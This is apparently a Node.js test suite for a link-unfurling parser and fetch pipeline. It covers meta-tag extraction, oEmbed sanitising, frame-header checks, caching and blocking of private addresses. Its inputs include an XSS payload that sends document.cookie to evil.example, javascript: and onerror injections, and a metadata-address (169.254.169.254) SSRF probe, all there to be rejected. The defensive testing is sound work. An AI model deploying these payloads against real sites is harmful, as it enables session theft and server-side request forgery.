/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   bridge-unfurl-parse.test.mjs                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: dlesieur <dlesieur@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/18 12:00:00 by dlesieur          #+#    #+#             */
/*   Updated: 2026/10/18 12:00:00 by dlesieur         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

// Parsers (pure) and the resolve pipeline against local servers.

import { describe, it, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

import { createUnfurler } from '../../scripts/bridge-unfurl-core.mjs';
import {
	absoluteHttpUrl,
	aspectOf,
	composeEmbedInfo,
	extractPage,
	frameableFrom,
	parseOembed,
	shapeEmbedInfo,
} from '../../scripts/bridge-unfurl-parse.mjs';
import { html, loopbackNet, sendHtml, startServer } from './bridge-unfurl-helpers.mjs';

const fixture = JSON.parse(readFileSync(new URL('../fixtures/embed-info.sample.json', import.meta.url), 'utf8'));
const BASE = 'https://site.example/dir/page';

describe('extractPage', () => {
	it('reads Open Graph, twitter and <title> with the documented precedence', () => {
		const page = extractPage(html('', `
			<title>  Fallback
			 title </title>
			<meta name="description" content="plain desc">
			<meta property="og:description" content="og desc">
			<meta name="twitter:title" content="tw title">
			<meta content="Site &amp; Co" property="og:site_name">
			<meta property="og:image" content="/img/cover.png">`), BASE);
		assert.equal(page.title, 'tw title');
		assert.equal(page.description, 'og desc');
		assert.equal(page.siteName, 'Site & Co');
		assert.equal(page.image, 'https://site.example/img/cover.png');
		assert.equal(extractPage(html('', '<title>  Fallback\n title </title>'), BASE).title, 'Fallback title');
	});

	it('keeps a > inside a quoted attribute', () => {
		const page = extractPage(html('', '<meta property="og:title" content="a > b"><meta property="og:description" content="after">'), BASE);
		assert.deepEqual([page.title, page.description], ['a > b', 'after']);
	});

	it('drops non-http(s) image and favicon URLs', () => {
		const page = extractPage(html('', '<meta property="og:image" content="javascript:alert(1)"><link rel="icon" href="data:image/png;base64,AAAA">'), BASE);
		assert.equal(page.image, null);
		assert.equal(page.favicon, 'https://site.example/favicon.ico');
		assert.equal(extractPage(html('', '<meta property="og:image" content="https://u:p@x.example/a.png">'), BASE).image, null);
		assert.equal(extractPage(html('', `<meta property="og:image" content="https://x.example/${'a'.repeat(2100)}">`), BASE).image, null);
	});

	it('resolves the favicon against the final URL, else /favicon.ico', () => {
		assert.equal(extractPage(html('', '<link rel="shortcut icon" href="../static/f.ico">'), BASE).favicon, 'https://site.example/static/f.ico');
		assert.equal(extractPage(html('', '<link rel="apple-touch-icon" href="/a.png"><link rel="icon" href="//cdn.example/i.png">'), BASE).favicon, 'https://cdn.example/i.png');
		assert.equal(extractPage(html(''), BASE).favicon, 'https://site.example/favicon.ico');
	});

	it('discovers the oEmbed endpoint', () => {
		const page = extractPage(html('', '<link rel="alternate" type="application/json+oembed" href="/oembed?url=x&amp;format=json" title="t"><link rel="alternate" type="text/xml+oembed" href="/xml">'), BASE);
		assert.equal(page.oembedHref, 'https://site.example/oembed?url=x&format=json');
		assert.equal(extractPage(html(''), BASE).oembedHref, null);
	});

	it('takes og:video only with type text/html, and twitter:player', () => {
		const og = (type) => extractPage(html('', `<meta property="og:video:secure_url" content="https://p.example/embed/1"><meta property="og:video:width" content="1280"><meta property="og:video:height" content="720">${type}`), BASE);
		assert.deepEqual(og('<meta property="og:video:type" content="text/html">').player, { src: 'https://p.example/embed/1', aspect: '16/9' });
		assert.equal(og('<meta property="og:video:type" content="video/mp4">').player, null);
		assert.equal(og('').player, null);
		const twitter = extractPage(html('', '<meta name="twitter:player" content="https://t.example/p"><meta name="twitter:player:width" content="640"><meta name="twitter:player:height" content="480">'), BASE);
		assert.deepEqual(twitter.player, { src: 'https://t.example/p', aspect: '4/3' });
		const unsafe = extractPage(html('', '<meta name="twitter:player" content="javascript:alert(1)">'), BASE);
		assert.equal(unsafe.player, null);
	});

	it('caps text fields', () => {
		const page = extractPage(html('', `<meta property="og:title" content="${'t'.repeat(900)}"><meta property="og:description" content="${'d'.repeat(900)}"><meta property="og:site_name" content="${'s'.repeat(900)}">`), BASE);
		assert.deepEqual([page.title.length, page.description.length, page.siteName.length], [300, 500, 100]);
	});
});

describe('parseOembed', () => {
	const endpoint = 'https://oembed.example/api';

	it('extracts only the iframe src and drops script content', () => {
		const html = '<script>fetch("//evil.example/?c="+document.cookie)</script><iframe src="https://player.example/v/1?a=1&amp;b=2" width="640" height="360"></iframe><img src=x onerror=alert(1)>';
		const result = parseOembed(JSON.stringify({ type: 'video', title: 'T', provider_name: 'Prov', thumbnail_url: 'https://i.example/t.jpg', width: 640, height: 360, html }), endpoint);
		assert.deepEqual(result.player, { src: 'https://player.example/v/1?a=1&b=2', aspect: '16/9' });
		assert.equal(JSON.stringify(result).includes('<script'), false);
		assert.equal(JSON.stringify(result).includes('evil.example'), false);
		assert.deepEqual([result.kind, result.title, result.provider, result.image], ['video', 'T', 'Prov', 'https://i.example/t.jpg']);
	});

	it('gives player null for a javascript:/data: iframe src or a missing iframe', () => {
		for (const src of ['javascript:alert(1)', 'data:text/html,<script>1</script>', '//', '']) {
			assert.equal(parseOembed(JSON.stringify({ type: 'rich', html: `<script>1</script><iframe src="${src}"></iframe>` }), endpoint).player, null, src);
		}
		assert.equal(parseOembed(JSON.stringify({ type: 'rich', html: '<blockquote>tweet</blockquote>' }), endpoint).player, null);
	});

	it('rejects non-objects, bad JSON and unknown types', () => {
		assert.equal(parseOembed('not json', endpoint), null);
		assert.equal(parseOembed('[1]', endpoint), null);
		assert.equal(parseOembed('null', endpoint), null);
		assert.equal(parseOembed(JSON.stringify({ type: 'exotic' }), endpoint).kind, 'link');
	});
});

describe('frameableFrom', () => {
	const cases = [
		[{}, true],
		[{ 'x-frame-options': 'DENY' }, false],
		[{ 'x-frame-options': 'sameorigin' }, false],
		[{ 'x-frame-options': 'ALLOW-FROM https://a.example' }, true],
		[{ 'content-security-policy': "default-src 'self'" }, true],
		[{ 'content-security-policy': "frame-ancestors 'none'" }, false],
		[{ 'content-security-policy': "default-src 'self'; frame-ancestors 'self' https://a.example" }, false],
		[{ 'content-security-policy': 'frame-ancestors *' }, true],
		[{ 'content-security-policy': 'frame-ancestors https://*.example.com' }, false],
		[{ 'content-security-policy': "img-src *, frame-ancestors 'none'" }, false],
		[{ 'x-frame-options': 'DENY', 'content-security-policy': 'frame-ancestors *' }, false],
	];
	for (const [headers, expected] of cases) it(`${JSON.stringify(headers)} -> ${expected}`, () => assert.equal(frameableFrom(headers), expected));
});

describe('EmbedInfo shape', () => {
	it('a fixture round-trips through shapeEmbedInfo unchanged', () => {
		assert.deepEqual(shapeEmbedInfo(fixture.url, fixture), fixture);
	});

	it('composeEmbedInfo output has exactly the fixture keys and types', () => {
		const page = extractPage(html('', '<meta property="og:title" content="A"><meta property="og:image" content="https://i.example/a.jpg">'), BASE);
		const oembed = parseOembed(JSON.stringify({ type: 'video', provider_name: 'Vimeo', html: '<iframe src="https://p.example/1"></iframe>', width: 640, height: 360 }), 'https://o.example/');
		for (const info of [composeEmbedInfo(BASE, page, oembed, true), composeEmbedInfo(BASE, page, null, null), shapeEmbedInfo(BASE, { kind: 'video', media: { src: 'https://x.example/a.mp4', mime: 'video/mp4' } })]) {
			assert.deepEqual(Object.keys(info).sort(), Object.keys(fixture).sort());
			for (const [key, sample] of Object.entries(fixture)) {
				const value = info[key];
				if (value === null) assert.ok(['provider', 'image', 'favicon', 'player', 'media', 'frameable'].includes(key), `${key} may not be null`);
				else assert.equal(typeof value, typeof sample, key);
			}
			assert.ok(['video', 'audio', 'rich', 'photo', 'file', 'link'].includes(info.kind));
			if (info.player) assert.match(info.player.aspect, /^\d{1,4}\/\d{1,4}$/);
		}
	});

	it('shapeEmbedInfo drops hostile URL fields and over-long text', () => {
		const info = shapeEmbedInfo(BASE, {
			title: 't'.repeat(999), description: 'd'.repeat(999), siteName: 's'.repeat(999), provider: 'p'.repeat(999),
			image: 'javascript:alert(1)', favicon: 'data:image/png;base64,AA',
			player: { src: 'javascript:alert(1)', aspect: '16/9' }, media: { src: 'blob:x', mime: 'video/mp4' },
		});
		assert.deepEqual([info.title.length, info.description.length, info.siteName.length, info.provider.length], [300, 500, 100, 100]);
		assert.deepEqual([info.image, info.favicon, info.player, info.media], [null, null, null, null]);
		assert.equal(shapeEmbedInfo(BASE, { player: { src: 'https://a.example/', aspect: '99999/1' } }).player.aspect, '16/9');
		assert.equal(shapeEmbedInfo(BASE, { media: { src: 'https://a.example/x', mime: 'text/html; <script>' } }).media, null);
	});

	it('aspectOf reduces, defaults and bounds', () => {
		assert.equal(aspectOf(1920, 1080), '16/9');
		assert.equal(aspectOf('640', '480'), '4/3');
		assert.equal(aspectOf(0, 10), '16/9');
		assert.equal(aspectOf(undefined, undefined), '16/9');
		assert.equal(aspectOf(100000, 99999), '16/9');
	});

	it('absoluteHttpUrl accepts only absolute http(s) without userinfo', () => {
		assert.equal(absoluteHttpUrl('//x.example/a', 'https://b.example/'), 'https://x.example/a');
		for (const bad of ['javascript:1', 'data:,x', 'blob:x', 'ftp://x/', 'https://u:p@x/', '', null, undefined, 5]) assert.equal(absoluteHttpUrl(bad, BASE), null, String(bad));
	});
});

describe('resolve pipeline', () => {
	async function setup(handler, limits) {
		const target = await startServer(handler);
		after(target.close);
		const net = loopbackNet({ ports: [target.port], names: { 'public.test': ['127.0.0.1'] }, limits });
		let clock = 1_000_000;
		const unfurler = createUnfurler({ netOptions: net.options, now: () => clock });
		return { target, net, unfurler, at: (path) => `http://public.test:${target.port}${path}`, advance: (ms) => { clock += ms; } };
	}

	it('follows oEmbed discovery and returns only the iframe src', async () => {
		const { unfurler, at, target } = await setup((request, response) => {
			if (request.url.startsWith('/oembed')) {
				response.writeHead(200, { 'content-type': 'application/json' });
				return response.end(JSON.stringify({ type: 'video', title: 'oEmbed title', provider_name: 'Prov', width: 800, height: 450, html: '<script>steal()</script><iframe src="https://player.example/e/9"></iframe>' }));
			}
			return sendHtml(response, html('', `<link rel="alternate" type="application/json+oembed" href="/oembed?u=1"><meta property="og:title" content="Page title"><meta property="og:description" content="Desc">`), { 'x-frame-options': 'DENY' });
		});
		const info = await unfurler.resolve(at('/watch#t=5'));
		assert.equal(info.kind, 'video');
		assert.equal(info.provider, 'Prov');
		assert.equal(info.title, 'Page title');
		assert.deepEqual(info.player, { src: 'https://player.example/e/9', aspect: '16/9' });
		assert.equal(info.frameable, false);
		assert.equal(info.url, at('/watch#t=5'));
		assert.equal(JSON.stringify(info).includes('steal'), false);
		assert.equal(target.seen.requests.length, 2);
	});

	it('does not follow an oEmbed endpoint that points at a private address', async () => {
		const { unfurler, at, net, target } = await setup((_request, response) => sendHtml(response, html('', '<meta property="og:title" content="Still ok"><link rel="alternate" type="application/json+oembed" href="http://169.254.169.254/oembed">')));
		const info = await unfurler.resolve(at('/'));
		assert.equal(info.title, 'Still ok');
		assert.equal(info.player, null);
		assert.deepEqual(net.attempts, ['public.test']);
		assert.equal(target.seen.requests.length, 1);
	});

	it('uses og:video / twitter:player when there is no oEmbed', async () => {
		const { unfurler, at } = await setup((_request, response) => sendHtml(response, html('', '<meta property="og:video:url" content="https://p.example/embed"><meta property="og:video:type" content="text/html"><meta property="og:title" content="V">')));
		const info = await unfurler.resolve(at('/'));
		assert.deepEqual([info.kind, info.player.src, info.frameable], ['video', 'https://p.example/embed', true]);
	});

	for (const [mime, kind] of [['video/mp4', 'video'], ['audio/mpeg', 'audio'], ['image/png', 'photo'], ['application/pdf', 'file']]) {
		it(`classifies ${mime} as ${kind} without reading the body`, async () => {
			let closed;
			const closedPromise = new Promise((resolve) => { closed = resolve; });
			const { unfurler, at } = await setup((_request, response) => {
				response.writeHead(200, { 'content-type': mime });
				response.write(Buffer.alloc(64 * 1024));
				response.on('close', closed);
			});
			const info = await unfurler.resolve(at('/files/a'));
			assert.equal(info.kind, kind);
			assert.deepEqual(info.media, { src: at('/files/a'), mime });
			assert.equal(info.frameable, null);
			await closedPromise;
		});
	}

	it('keeps media.src on the final URL after a redirect', async () => {
		const { unfurler, at } = await setup((request, response) => {
			if (request.url === '/short') { response.writeHead(302, { location: '/video.mp4' }); return response.end(); }
			response.writeHead(200, { 'content-type': 'video/mp4' });
			return response.end();
		});
		const info = await unfurler.resolve(at('/short'));
		assert.equal(info.media.src, at('/video.mp4'));
		assert.equal(info.url, at('/short'));
	});

	it('uses fixed error messages with no upstream detail', async () => {
		const { unfurler, at } = await setup((_request, response) => { response.writeHead(418, { 'x-secret': 'detail' }); response.end('teapot'); });
		await assert.rejects(unfurler.resolve(at('/')), (error) => error.status === 502 && error.message === 'Could not fetch the link.');
	});

	it('caches successes for 24 h and failures for 10 min', async () => {
		let status = 200;
		const { unfurler, at, advance, target } = await setup((_request, response) => {
			if (status !== 200) { response.writeHead(status); return response.end(); }
			return sendHtml(response, html('', '<title>cached</title>'));
		});
		await unfurler.resolve(at('/ok#a'));
		const second = await unfurler.resolve(at('/ok#b'));
		assert.equal(second.url, at('/ok#b'));
		assert.equal(target.seen.requests.length, 1, 'fragments share one cache entry');
		advance(23 * 3600_000);
		await unfurler.resolve(at('/ok'));
		assert.equal(target.seen.requests.length, 1);
		advance(2 * 3600_000);
		await unfurler.resolve(at('/ok'));
		assert.equal(target.seen.requests.length, 2);

		status = 500;
		await assert.rejects(unfurler.resolve(at('/bad')), (error) => error.status === 502);
		await assert.rejects(unfurler.resolve(at('/bad')), (error) => error.status === 502);
		assert.equal(target.seen.requests.length, 3, 'failure served from cache');
		advance(11 * 60_000);
		status = 200;
		assert.equal((await unfurler.resolve(at('/bad'))).title, 'cached');
		assert.equal(target.seen.requests.length, 4);
	});

	it('evicts the least recently used entry beyond 500', async () => {
		const { unfurler, at, target } = await setup((_request, response) => sendHtml(response, html('', '<title>x</title>')));
		for (let n = 0; n < 501; n += 1) await unfurler.resolve(at(`/${n}`));
		assert.equal(unfurler.cacheSize(), 500);
		const before = target.seen.requests.length;
		await unfurler.resolve(at('/500'));
		assert.equal(target.seen.requests.length, before, 'newest is cached');
		await unfurler.resolve(at('/0'));
		assert.equal(target.seen.requests.length, before + 1, 'oldest was evicted');
	});
});
